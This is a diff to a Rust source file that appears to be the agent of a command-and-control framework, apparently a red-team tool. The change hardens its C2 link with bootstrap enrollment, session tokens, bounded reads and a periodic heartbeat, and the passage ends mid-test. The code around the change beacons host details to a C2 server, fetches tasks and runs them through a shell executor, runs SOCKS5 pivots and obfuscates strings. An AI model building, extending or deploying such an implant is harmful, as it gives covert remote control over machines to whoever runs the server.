@@ -1,3 +1,4 @@
+use crate::auth::{AgentAuth, CredentialSource, CredentialUse, SecretCredential};
 use crate::config::{validate_c2_base_url, AgentConfig};
 use crate::networking::egress::get_egress_ip;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
@@ -15,11 +16,13 @@ use log::{debug, error, info, warn};
 use obfstr::obfstr;
 use once_cell::sync::Lazy;
 use os_info;
-use reqwest::{Method, StatusCode, Url};
+use reqwest::{Client, Method, RequestBuilder, Response, StatusCode, Url};
+use serde::Deserialize;
 use serde_json::{json, Value};
 use std::collections::{HashMap, VecDeque};
 use std::env;
 use std::io::{self, Read};
+use std::net::IpAddr;
 use std::process::{Command, ExitStatus, Stdio};
 use std::sync::mpsc as std_mpsc;
 use std::sync::Arc;
@@ -28,6 +31,7 @@ use std::time::{Duration, Instant};
 use tokio::sync::mpsc;
 use tokio::sync::Mutex as TokioMutex;
 use tokio::task::JoinHandle;
+use zeroize::Zeroizing;
 
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> =
     Lazy::new(|| TokioMutex::new(HashMap::new()));
@@ -39,6 +43,11 @@ const OUTPUT_READ_CHUNK_BYTES: usize = 16 * 1024;
 const OUTPUT_CHANNEL_CAPACITY: usize = 16;
 const MAX_OUTPUT_EVENTS_PER_TICK: usize = OUTPUT_CHANNEL_CAPACITY * 2;
 const MAX_TERMINAL_TASK_IDS: usize = 1_024;
+const MAX_HEARTBEAT_RESPONSE_BYTES: usize = 64 * 1024;
+const MAX_TASK_RESPONSE_BYTES: usize = 64 * 1024;
+const MAX_HEARTBEAT_IP_ENTRIES: usize = 32;
+const MAX_HEARTBEAT_NETWORK_FIELD_CHARS: usize = 512;
+const MAX_AUTHENTICATED_HEARTBEAT_INTERVAL: Duration = Duration::from_secs(60);
 
 #[derive(Clone, Copy)]
 enum C2Endpoint<'a> {
@@ -118,25 +127,32 @@ fn create_command(command: &str) -> Command {
 }
 
 fn get_all_local_ips() -> Vec<String> {
-    let mut ips = Vec::new();
-    if let Ok(ifaces) = get_if_addrs() {
-        for iface in ifaces {
-            match iface.addr.ip() {
-                // Use .ip() to get the IpAddr
-                std::net::IpAddr::V4(ipv4) => {
-                    if !ipv4.is_loopback() && !ipv4.is_multicast() {
-                        ips.push(ipv4.to_string());
-                    }
-                }
-                std::net::IpAddr::V6(ipv6) => {
-                    if !ipv6.is_loopback() && !ipv6.is_multicast() {
-                        ips.push(ipv6.to_string());
-                    }
-                }
-            }
-        }
-    }
-    ips
+    get_if_addrs()
+        .map(|ifaces| {
+            ifaces
+                .into_iter()
+                .map(|iface| iface.addr.ip().to_string())
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+fn normalized_local_ips(candidates: Vec<String>) -> Vec<String> {
+    let mut addresses: Vec<IpAddr> = candidates
+        .into_iter()
+        .filter_map(|candidate| candidate.parse::<IpAddr>().ok())
+        .filter(|address| match address {
+            IpAddr::V4(address) => !address.is_loopback() && !address.is_multicast(),
+            IpAddr::V6(address) => !address.is_loopback() && !address.is_multicast(),
+        })
+        .collect();
+    addresses.sort_unstable();
+    addresses.dedup();
+    addresses.truncate(MAX_HEARTBEAT_IP_ENTRIES);
+    addresses
+        .into_iter()
+        .map(|address| address.to_string())
+        .collect()
 }
 
 #[derive(Clone, Debug, Eq, PartialEq)]
@@ -728,33 +744,84 @@ fn mark_noisy_command_executed() {
     });
 }
 
-// Send heartbeat to the server
-pub async fn send_heartbeat_with_client(
+#[derive(Deserialize)]
+struct HeartbeatResponse {
+    #[serde(default)]
+    session_credential: Option<String>,
+}
+
+fn build_c2_client(config: &AgentConfig, server_addr: &str) -> io::Result<Client> {
+    let requested = config
+        .validate_transport_policy(server_addr)
+        .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
+    let configured = config
+        .get_validated_server_url()
+        .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
+    if requested != configured {
+        return Err(io::Error::new(
+            io::ErrorKind::PermissionDenied,
+            "runtime C2 destination differs from the embedded configuration",
+        ));
+    }
+    config.build_http_client()
+}
+
+fn authorize_request(request: RequestBuilder, credential: &CredentialUse) -> RequestBuilder {
+    request.bearer_auth(credential.credential.expose())
+}
+
+#[derive(Clone, Copy, Debug, Eq, PartialEq)]
+enum HeartbeatAttempt {
+    Accepted,
+    Unauthorized,
+}
+
+async fn read_bounded_response_body(
+    mut response: Response,
+    maximum_bytes: usize,
+    response_name: &str,
+) -> io::Result<Vec<u8>> {
+    if response
+        .content_length()
+        .is_some_and(|length| length > maximum_bytes as u64)
+    {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            format!("{response_name} response exceeds the supported size"),
+        ));
+    }
+
+    let mut body = Vec::new();
+    while let Some(chunk) = response.chunk().await.map_err(io::Error::other)? {
+        if body.len().saturating_add(chunk.len()) > maximum_bytes {
+            return Err(io::Error::new(
+                io::ErrorKind::InvalidData,
+                format!("{response_name} response exceeds the supported size"),
+            ));
+        }
+        body.extend_from_slice(&chunk);
+    }
+    Ok(body)
+}
+
+async fn send_heartbeat_once(
     config: &AgentConfig,
     server_addr: &str,
     agent_id: &str,
-) -> io::Result<()> {
+    auth: &AgentAuth,
+    credential: &CredentialUse,
+    expected_prior_session: Option<&SecretCredential>,
+) -> io::Result<HeartbeatAttempt> {
     let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Heartbeat)?;
     info!(
         "[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})",
         url, config.socks5_enabled
     );
-    let client = match config.build_http_client() {
-        Ok(client) => client,
-        Err(e) => {
-            update_c2_failure_state(false);
-            return Err(io::Error::other(e));
-        }
-    };
+    let client = build_c2_client(config, server_addr)?;
 
     let os = os_info::get();
     let hostname = hostname::get()?.to_string_lossy().to_string();
     let ip_list = get_all_local_ips();
-    let ip = if ip_list.is_empty() {
-        "Unknown".into()
-    } else {
-        ip_list.join(",")
-    };
     let egress_ip = get_egress_ip(server_addr);
 
     let data = build_heartbeat_payload(
@@ -762,33 +829,183 @@ pub async fn send_heartbeat_with_client(
         agent_id,
         os.os_type().to_string(),
         hostname,
-        ip,
         ip_list,
         egress_ip,
     );
 
-    match client.request(Method::POST, url).json(&data).send().await {
+    match authorize_request(client.request(Method::POST, url), credential)
+        .json(&data)
+        .send()
+        .await
+    {
         Ok(response) => {
+            let status = response.status();
             info!(
                 "[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})",
-                response.status(),
-                config.socks5_enabled
+                status, config.socks5_enabled
             );
-            if response.status().is_success() {
-                update_c2_failure_state(true); // SUCCESS
-                Ok(())
-            } else {
-                error!("[HTTP] Heartbeat failed with status: {}", response.status());
-                update_c2_failure_state(false); // FAILURE
-                Err(io::Error::other("Heartbeat failed"))
+            if status == StatusCode::UNAUTHORIZED {
+                return Ok(HeartbeatAttempt::Unauthorized);
             }
+            if !status.is_success() {
+                error!("[HTTP] Heartbeat failed with status: {}", status);
+                return Err(io::Error::other(format!(
+                    "heartbeat failed with status {status}"
+                )));
+            }
+            let body = Zeroizing::new(
+                read_bounded_response_body(response, MAX_HEARTBEAT_RESPONSE_BYTES, "heartbeat")
+                    .await?,
+            );
+            if !body.is_empty() {
+                let response: HeartbeatResponse = serde_json::from_slice(&body).map_err(|err| {
+                    io::Error::new(
+                        io::ErrorKind::InvalidData,
+                        format!("invalid heartbeat response JSON: {err}"),
+                    )
+                })?;
+                if let Some(session_credential) = response.session_credential {
+                    match credential.source {
+                        CredentialSource::Bootstrap => auth.persist_bootstrap_session(
+                            session_credential,
+                            expected_prior_session,
+                        )?,
+                        CredentialSource::Session => {
+                            debug_assert!(expected_prior_session.is_none());
+                            auth.persist_session(session_credential)?;
+                        }
+                    }
+                }
+            }
+            Ok(HeartbeatAttempt::Accepted)
         }
         Err(e) => {
             error!("[HTTP] Heartbeat POST failed: {}", e);
-            update_c2_failure_state(false); // FAILURE
             Err(io::Error::other(e))
         }
     }
+}
+
+async fn bootstrap_enrollment(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    auth: &AgentAuth,
+    expected_prior_session: Option<&SecretCredential>,
+) -> io::Result<()> {
+    let bootstrap = auth.bootstrap_credential()?;
+    match send_heartbeat_once(
+        config,
+        server_addr,
+        agent_id,
+        auth,
+        &bootstrap,
+        expected_prior_session,
+    )
+    .await?
+    {
+        HeartbeatAttempt::Accepted => Ok(()),
+        HeartbeatAttempt::Unauthorized => Err(io::Error::new(
+            io::ErrorKind::PermissionDenied,
+            "bootstrap enrollment was rejected",
+        )),
+    }
+}
+
+async fn recover_authentication(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    auth: &AgentAuth,
+) -> io::Result<()> {
+    let current = auth.active_credential()?;
+    if current.source == CredentialSource::Session
+        && matches!(
+            send_heartbeat_once(config, server_addr, agent_id, auth, &current, None).await,
+            Ok(HeartbeatAttempt::Accepted)
+        )
+    {
+        return Ok(());
+    }
+    let expected_prior_session =
+        (current.source == CredentialSource::Session).then_some(&current.credential);
+    bootstrap_enrollment(config, server_addr, agent_id, auth, expected_prior_session).await
+}
+
+async fn send_authenticated_request<F>(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    auth: &AgentAuth,
+    build_request: F,
+) -> io::Result<Response>
+where
+    F: Fn(&Client) -> RequestBuilder,
+{
+    let client = build_c2_client(config, server_addr)?;
+    let credential = match auth.session_credential() {
+        Some(credential) => credential,
+        None => {
+            bootstrap_enrollment(config, server_addr, agent_id, auth, None).await?;
+            auth.session_credential().ok_or_else(|| {
+                io::Error::new(
+                    io::ErrorKind::PermissionDenied,
+                    "heartbeat enrollment did not provide a session credential",
+                )
+            })?
+        }
+    };
+    let response = authorize_request(build_request(&client), &credential)
+        .send()
+        .await
+        .map_err(io::Error::other)?;
+    if response.status() != StatusCode::UNAUTHORIZED {
+        return Ok(response);
+    }
+
+    recover_authentication(config, server_addr, agent_id, auth).await?;
+    let refreshed = auth.session_credential().ok_or_else(|| {
+        io::Error::new(
+            io::ErrorKind::PermissionDenied,
+            "authentication recovery did not provide a session credential",
+        )
+    })?;
+    authorize_request(build_request(&client), &refreshed)
+        .send()
+        .await
+        .map_err(io::Error::other)
+}
+
+// Send a heartbeat using the current session, or enroll with the bootstrap
+// credential when no durable session exists.
+pub async fn send_heartbeat_with_client(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    auth: &AgentAuth,
+) -> io::Result<()> {
+    let current = auth.active_credential()?;
+    let result = send_heartbeat_once(config, server_addr, agent_id, auth, &current, None).await;
+    let result = match result {
+        Ok(HeartbeatAttempt::Accepted) => Ok(()),
+        Ok(HeartbeatAttempt::Unauthorized) if current.source == CredentialSource::Session => {
+            bootstrap_enrollment(
+                config,
+                server_addr,
+                agent_id,
+                auth,
+                Some(&current.credential),
+            )
+            .await
+        }
+        Ok(HeartbeatAttempt::Unauthorized) => Err(io::Error::new(
+            io::ErrorKind::PermissionDenied,
+            "heartbeat authentication was rejected",
+        )),
+        Err(err) => Err(err),
+    };
+    update_c2_failure_state(result.is_ok());
+    result
 }
 
 fn build_heartbeat_payload(
@@ -796,10 +1013,15 @@ fn build_heartbeat_payload(
     agent_id: &str,
     os: String,
     hostname: String,
-    ip: String,
     ip_list: Vec<String>,
     egress_ip: String,
 ) -> Value {
+    let ip_list = normalized_local_ips(ip_list);
+    let ip = ip_list
+        .first()
+        .cloned()
+        .unwrap_or_else(|| "Unknown".to_string());
+    debug_assert!(ip.chars().count() <= MAX_HEARTBEAT_NETWORK_FIELD_CHARS);
     json!({
         "id": agent_id,
         "payload_id": config.payload_id,
@@ -818,21 +1040,18 @@ async fn get_task_with_client(
     config: &AgentConfig,
     server_addr: &str,
     agent_id: &str,
+    auth: &AgentAuth,
 ) -> io::Result<Option<Task>> {
     let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Tasks)?;
     info!(
         "[HTTP] Sending task GET to {} (SOCKS5 enabled: {})",
         url, config.socks5_enabled
     );
-    let client = match config.build_http_client() {
-        Ok(client) => client,
-        Err(e) => {
-            update_c2_failure_state(false);
-            return Err(io::Error::other(e));
-        }
-    };
-
-    match client.request(Method::GET, url).send().await {
+    match send_authenticated_request(config, server_addr, agent_id, auth, |client| {
+        client.request(Method::GET, url.clone())
+    })
+    .await
+    {
         Ok(response) => {
             info!(
                 "[HTTP] Task GET response: {} (SOCKS5 enabled: {})",
@@ -844,7 +1063,16 @@ async fn get_task_with_client(
                 return Ok(None);
             }
             if response.status().is_success() {
-                match response.json::<Task>().await {
+                let body =
+                    read_bounded_response_body(response, MAX_TASK_RESPONSE_BYTES, "task").await;
+                match body.and_then(|body| {
+                    serde_json::from_slice::<Task>(&body).map_err(|err| {
+                        io::Error::new(
+                            io::ErrorKind::InvalidData,
+                            format!("invalid task JSON: {err}"),
+                        )
+                    })
+                }) {
                     Ok(task) => {
                         if let Err(err) = task.validate_for_agent(agent_id) {
                             error!("[HTTP] Rejected invalid task: {}", err);
@@ -857,10 +1085,7 @@ async fn get_task_with_client(
                     Err(err) => {
                         error!("[HTTP] Failed to parse task response JSON: {}", err);
                         update_c2_failure_state(false);
-                        Err(io::Error::new(
-                            io::ErrorKind::InvalidData,
-                            format!("invalid task JSON: {err}"),
-                        ))
+                        Err(err)
                     }
                 }
             } else {
@@ -887,6 +1112,7 @@ async fn submit_running_status_with_client(
     config: &AgentConfig,
     server_addr: &str,
     agent_id: &str,
+    auth: &AgentAuth,
     task: &Task,
     started_at: &str,
 ) -> SubmissionOutcome {
@@ -902,15 +1128,11 @@ async fn submit_running_status_with_client(
         "[HTTP] Sending running status POST to {} (SOCKS5 enabled: {})",
         url, config.socks5_enabled
     );
-    let client = match config.build_http_client() {
-        Ok(client) => client,
-        Err(e) => {
-            update_c2_failure_state(false);
-            return SubmissionOutcome::Permanent(e.to_string());
-        }
-    };
-
-    match client.request(Method::POST, url).json(&update).send().await {
+    match send_authenticated_request(config, server_addr, agent_id, auth, |client| {
+        client.request(Method::POST, url.clone()).json(&update)
+    })
+    .await
+    {
         Ok(response) => {
             info!(
                 "[HTTP] Running status POST response: {} (SOCKS5 enabled: {})",
@@ -932,7 +1154,7 @@ async fn submit_running_status_with_client(
         Err(err) => {
             error!("[HTTP] Running status POST failed: {}", err);
             update_c2_failure_state(false);
-            SubmissionOutcome::Retryable(err.to_string())
+            classify_submission_error(err)
         }
     }
 }
@@ -941,6 +1163,7 @@ async fn submit_task_result_with_client(
     config: &AgentConfig,
     server_addr: &str,
     agent_id: &str,
+    auth: &AgentAuth,
     result: &TaskResult,
 ) -> SubmissionOutcome {
     let url = match build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Results) {
@@ -960,17 +1183,13 @@ async fn submit_task_result_with_client(
         "[HTTP] Sending typed result POST to {} (SOCKS5 enabled: {})",
         url, config.socks5_enabled
     );
-    let client = match config.build_http_client() {
-        Ok(client) => client,
-        Err(err) => {
-            update_c2_failure_state(false);
-            return SubmissionOutcome::Permanent(err.to_string());
-        }
-    };
-
     // Typed v1 output fields are plain UTF-8 by contract. XOR decoding remains
     // limited to the deprecated legacy /result route on the server.
-    match client.request(Method::POST, url).json(result).send().await {
+    match send_authenticated_request(config, server_addr, agent_id, auth, |client| {
+        client.request(Method::POST, url.clone()).json(result)
+    })
+    .await
+    {
         Ok(response) => {
             info!(
                 "[HTTP] Typed result POST response: {} (SOCKS5 enabled: {})",
@@ -992,7 +1211,7 @@ async fn submit_task_result_with_client(
         Err(err) => {
             error!("[HTTP] Typed result POST failed: {}", err);
             update_c2_failure_state(false);
-            SubmissionOutcome::Retryable(err.to_string())
+            classify_submission_error(err)
         }
     }
 }
@@ -1009,13 +1228,22 @@ fn classify_submission_status(status: StatusCode, operation: &str) -> Submission
         return SubmissionOutcome::Accepted;
     }
     let message = format!("{operation} submission failed with status {status}");
-    if status == StatusCode::REQUEST_TIMEOUT
+    if status == StatusCode::UNAUTHORIZED
+        || status == StatusCode::REQUEST_TIMEOUT
         || status == StatusCode::TOO_MANY_REQUESTS
         || status.is_server_error()
     {
         SubmissionOutcome::Retryable(message)
     } else {
         SubmissionOutcome::Permanent(message)
+    }
+}
+
+fn classify_submission_error(error: io::Error) -> SubmissionOutcome {
+    if error.kind() == io::ErrorKind::InvalidInput {
+        SubmissionOutcome::Permanent(error.to_string())
+    } else {
+        SubmissionOutcome::Retryable(error.to_string())
     }
 }
 
@@ -1070,6 +1298,7 @@ struct HttpTaskTransport<'a> {
     config: &'a AgentConfig,
     server_addr: &'a str,
     agent_id: &'a str,
+    auth: &'a AgentAuth,
 }
 
 impl TaskTransport for HttpTaskTransport<'_> {
@@ -1078,6 +1307,7 @@ impl TaskTransport for HttpTaskTransport<'_> {
             self.config,
             self.server_addr,
             self.agent_id,
+            self.auth,
             task,
             started_at,
         )
@@ -1085,7 +1315,14 @@ impl TaskTransport for HttpTaskTransport<'_> {
     }
 
     async fn submit_result(&self, result: &TaskResult) -> SubmissionOutcome {
-        submit_task_result_with_client(self.config, self.server_addr, self.agent_id, result).await
+        submit_task_result_with_client(
+            self.config,
+            self.server_addr,
+            self.agent_id,
+            self.auth,
+            result,
+        )
+        .await
     }
 }
 
@@ -1394,11 +1631,17 @@ fn task_may_start_at(task: &Task, now: DateTime<Utc>) -> Result<(), String> {
     Ok(())
 }
 
-async fn process_task_outbox(config: &AgentConfig, server_addr: &str, agent_id: &str) {
+async fn process_task_outbox(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    auth: &AgentAuth,
+) {
     let transport = HttpTaskTransport {
         config,
         server_addr,
         agent_id,
+        auth,
     };
     TASK_OUTBOX
         .process_all(&transport, &ShellTaskExecutor)
@@ -1436,10 +1679,30 @@ fn starts_with_command_token(cmd: &str, token: &str) -> bool {
     }
 }
 
+async fn run_authenticated_heartbeat_loop(
+    config: AgentConfig,
+    server_addr: String,
+    agent_id: String,
+    auth: Arc<AgentAuth>,
+    interval: Duration,
+) {
+    let start = tokio::time::Instant::now() + interval;
+    let mut ticker = tokio::time::interval_at(start, interval);
+    ticker.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
+    loop {
+        ticker.tick().await;
+        if let Err(err) = send_heartbeat_with_client(&config, &server_addr, &agent_id, &auth).await
+        {
+            warn!("[SHELL] Periodic authenticated heartbeat failed: {err}");
+        }
+    }
+}
+
 // Main function to run the shell
 pub async fn agent_loop(
     server_addr: &str,
     agent_id: &str,
+    auth: Arc<AgentAuth>,
     _pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>, // Prefix with underscore
     _pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>, // Prefix with underscore
 ) -> Result<(), Box<dyn std::error::Error>> {
@@ -1447,7 +1710,8 @@ pub async fn agent_loop(
     info!("[SHELL] Entering agent_loop (BackgroundOpsec Active)");
     // Initial heartbeat for this active period
     // Use a separate Result variable to avoid breaking loop on first heartbeat failure
-    let initial_heartbeat_result = send_heartbeat_with_client(&config, server_addr, agent_id).await;
+    let initial_heartbeat_result =
+        send_heartbeat_with_client(&config, server_addr, agent_id, &auth).await;
     if let Err(e) = initial_heartbeat_result {
         error!(
             "[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.",
@@ -1455,6 +1719,13 @@ pub async fn agent_loop(
         );
         // No need to break explicitly, loop condition will handle it if state changed due to failure
     }
+    let heartbeat_task = tokio::spawn(run_authenticated_heartbeat_loop(
+        config.clone(),
+        server_addr.to_string(),
+        agent_id.to_string(),
+        auth.clone(),
+        MAX_AUTHENTICATED_HEARTBEAT_INTERVAL,
+    ));
 
     loop {
         // Determine current OPSEC mode *before* acting
@@ -1476,12 +1747,12 @@ pub async fn agent_loop(
         // Resolve an uncertain running/result delivery before accepting more
         // work. The in-memory outbox keeps the original timestamp and result
         // payload intact across retries.
-        process_task_outbox(&config, server_addr, agent_id).await;
+        process_task_outbox(&config, server_addr, agent_id, &auth).await;
 
         if TASK_OUTBOX.has_pending() {
             debug!("[SHELL] Pending task delivery remains; deferring the next task poll");
         } else {
-            match get_task_with_client(&config, server_addr, agent_id).await {
+            match get_task_with_client(&config, server_addr, agent_id, &auth).await {
                 Ok(Some(task)) => {
                     info!(
                         "[SHELL] Received task {} (type: {:?})",
@@ -1493,7 +1764,7 @@ pub async fn agent_loop(
                     } else {
                         debug!("[SHELL] Ignoring duplicate delivery for task {}", task_id);
                     }
-                    process_task_outbox(&config, server_addr, agent_id).await;
+                    process_task_outbox(&config, server_addr, agent_id, &auth).await;
                 }
                 Ok(None) => {
                     debug!("[SHELL] No task available");
@@ -1512,6 +1783,8 @@ pub async fn agent_loop(
         // Outer loop condition will re-evaluate OPSEC mode on next iteration
     }
 
+    heartbeat_task.abort();
+    let _ = heartbeat_task.await;
     Ok(())
 }
 
@@ -1550,7 +1823,27 @@ async fn stop_pivot_server(port: u16) -> Result<String, String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::auth::SecretCredential;
+    use std::fs;
+    use std::path::PathBuf;
     use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::time::{SystemTime, UNIX_EPOCH};
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    use tokio::net::TcpListener;
+
+    const TEST_BOOTSTRAP_CREDENTIAL: &str = "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI";
+    const TEST_SESSION_ONE: &str = concat!(
+        "s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.1.",
+        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"
+    );
+    const TEST_SESSION_TWO: &str = concat!(
+        "s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.2.",
+        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"
+    );
+    const TEST_SESSION_THREE: &str = concat!(
+        "s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.3.",
+        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"
+    );
 
     #[test]
     fn builds_c2_endpoint_urls_from_validated_base() -> io::Result<()> {
@@ -1599,6 +1892,24 @@ mod tests {
         };
 
         assert_eq!(err.kind(), io::ErrorKind::InvalidInput);
+    }
+
+    #[test]
+    fn c2_client_rejects_any_runtime_destination_override() {
+        let config = AgentConfig {
+            server_url: "https://c2.example:8443/base".to_string(),
+            ..Default::default()
+        };
+
+        let different_origin = build_c2_client(&config, "https://other.example:8443/base")
+            .expect_err("different origin must fail");
+        assert_eq!(different_origin.kind(), io::ErrorKind::PermissionDenied);
+
+        let different_path = build_c2_client(&config, "https://c2.example:8443/other")
+            .expect_err("different base path must fail");
+        assert_eq!(different_path.kind(), io::ErrorKind::PermissionDenied);
+
+        assert!(build_c2_client(&config, "https://c2.example:8443/base").is_ok());
     }
 
     #[test]
@@ -1848,6 +2159,10 @@ mod tests {
             SubmissionOutcome::Retryable(_)
         ));
         assert!(matches!(
+            classify_submission_status(StatusCode::UNAUTHORIZED, "result"),
+            SubmissionOutcome::Retryable(_)
+        ));
+        assert!(matches!(
             classify_submission_status(StatusCode::CONFLICT, "result"),
             SubmissionOutcome::Permanent(_)
         ));
@@ -2014,6 +2329,302 @@ mod tests {
         ));
     }
 
+    #[tokio::test]
+    async fn task_poll_enrolls_first_and_never_sends_bootstrap_to_task_route() {
+        let listener = TcpListener::bind("127.0.0.1:0")
+            .await
+            .expect("bind enrollment test server");
+        let server_addr = format!(
+            "http://{}",
+            listener.local_addr().expect("enrollment test address")
+        );
+        let requests = Arc::new(Mutex::new(Vec::<String>::new()));
+        let captured = requests.clone();
+        let server = tokio::spawn(async move {
+            for (status, body) in [
+                (
+                    "200 OK",
+                    concat!(
+                        r#"{"session_credential":"s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.1."#,
+                        r#"Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"}"#
+                    ),
+                ),
+                ("204 No Content", ""),
+            ] {
+                let (mut stream, _) = listener.accept().await.expect("accept enrollment request");
+                let request = read_http_request(&mut stream).await;
+                captured
+                    .lock()
+                    .unwrap_or_else(std::sync::PoisonError::into_inner)
+                    .push(request);
+                let response = format!(
+                    "HTTP/1.1 {status}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                    body.len()
+                );
+                stream
+                    .write_all(response.as_bytes())
+                    .await
+                    .expect("write enrollment response");
+            }
+        });
+
+        let state_dir = unique_auth_test_dir();
+        let config = AgentConfig {
+            server_url: server_addr.clone(),
+            listener_id: "listener-one".to_string(),
+            payload_id: "payload-one".to_string(),
+            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
+                .expect("bootstrap credential"),
+            allow_insecure_isolated_lab: true,
+            ..Default::default()
+        };
+        let auth =
+            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");
+
+        let task = get_task_with_client(&config, &server_addr, "agent-one", &auth)
+            .await
+            .expect("poll task");
+        server.await.expect("enrollment test server");
+        assert!(task.is_none());
+
+        let captured = requests
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        assert_eq!(captured.len(), 2);
+        assert!(captured[0].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
+        assert_request_auth(&captured[0], TEST_BOOTSTRAP_CREDENTIAL);
+        assert!(captured[1].starts_with("GET /api/agent/agent-one/tasks HTTP/1.1"));
+        assert_request_auth(&captured[1], TEST_SESSION_ONE);
+        drop(captured);
+
+        let _ = fs::remove_dir_all(state_dir);
+    }
+
+    #[tokio::test]
+    async fn oversized_task_response_is_rejected_before_deserialization() {
+        let listener = TcpListener::bind("127.0.0.1:0")
+            .await
+            .expect("bind oversized response server");
+        let server_addr = format!(
+            "http://{}",
+            listener.local_addr().expect("oversized response address")
+        );
+        let server = tokio::spawn(async move {
+            let (mut stream, _) = listener.accept().await.expect("accept task request");
+            let request = read_http_request(&mut stream).await;
+            assert!(request.starts_with("GET /api/agent/agent-one/tasks HTTP/1.1"));
+            assert_request_auth(&request, TEST_SESSION_ONE);
+            let response = format!(
+                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                MAX_TASK_RESPONSE_BYTES + 1
+            );
+            stream
+                .write_all(response.as_bytes())
+                .await
+                .expect("write oversized response headers");
+        });
+
+        let state_dir = unique_auth_test_dir();
+        let config = AgentConfig {
+            server_url: server_addr.clone(),
+            listener_id: "listener-one".to_string(),
+            payload_id: "payload-one".to_string(),
+            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
+                .expect("bootstrap credential"),
+            allow_insecure_isolated_lab: true,
+            ..Default::default()
+        };
+        let auth =
+            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");
+        auth.persist_session(TEST_SESSION_ONE.to_string())
+            .expect("persist session");
+
+        let error = get_task_with_client(&config, &server_addr, "agent-one", &auth)
+            .await
+            .expect_err("oversized task response must fail");
+        assert_eq!(error.kind(), io::ErrorKind::InvalidData);
+        assert!(error.to_string().contains("exceeds the supported size"));
+        server.await.expect("oversized response server");
+
+        let _ = fs::remove_dir_all(state_dir);
+    }
+
+    #[tokio::test]
+    async fn authenticated_heartbeat_runs_periodically_during_agent_work() {
+        let listener = TcpListener::bind("127.0.0.1:0")
+            .await
+            .expect("bind periodic heartbeat server");
+        let server_addr = format!(
+            "http://{}",
+            listener.local_addr().expect("heartbeat server address")
+        );
+        let heartbeat_count = Arc::new(AtomicUsize::new(0));
+        let observed = heartbeat_count.clone();
+        let server = tokio::spawn(async move {
+            while observed.load(Ordering::SeqCst) < 2 {
+                let (mut stream, _) = listener.accept().await.expect("accept heartbeat");
+                let request = read_http_request(&mut stream).await;
+                assert!(request.starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
+                assert_request_auth(&request, TEST_SESSION_ONE);
+                observed.fetch_add(1, Ordering::SeqCst);
+                stream
+                    .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+                    .await
+                    .expect("write heartbeat response");
+            }
+        });
+
+        let state_dir = unique_auth_test_dir();
+        let config = AgentConfig {
+            server_url: server_addr.clone(),
+            listener_id: "listener-one".to_string(),
+            payload_id: "payload-one".to_string(),
+            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
+                .expect("bootstrap credential"),
+            allow_insecure_isolated_lab: true,
+            ..Default::default()
+        };
+        let auth =
+            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");
+        auth.persist_session(TEST_SESSION_ONE.to_string())
+            .expect("persist session");
+        let heartbeat_task = tokio::spawn(run_authenticated_heartbeat_loop(
+            config,
+            server_addr,
+            "agent-one".to_string(),
+            Arc::new(auth),
+            Duration::from_millis(10),
+        ));
+
+        tokio::time::timeout(Duration::from_secs(2), server)
+            .await
+            .expect("periodic heartbeat deadline")
+            .expect("periodic heartbeat server");
+        heartbeat_task.abort();
+        let _ = heartbeat_task.await;
+        assert!(heartbeat_count.load(Ordering::SeqCst) >= 2);
+
+        let _ = fs::remove_dir_all(state_dir);
+    }
+
+    #[tokio::test]
+    async fn unauthorized_delivery_reenrolls_and_retries_without_rerunning_task() {
+        let listener = TcpListener::bind("127.0.0.1:0")
+            .await
+            .expect("bind auth test server");
+        let server_addr = format!(
+            "http://{}",
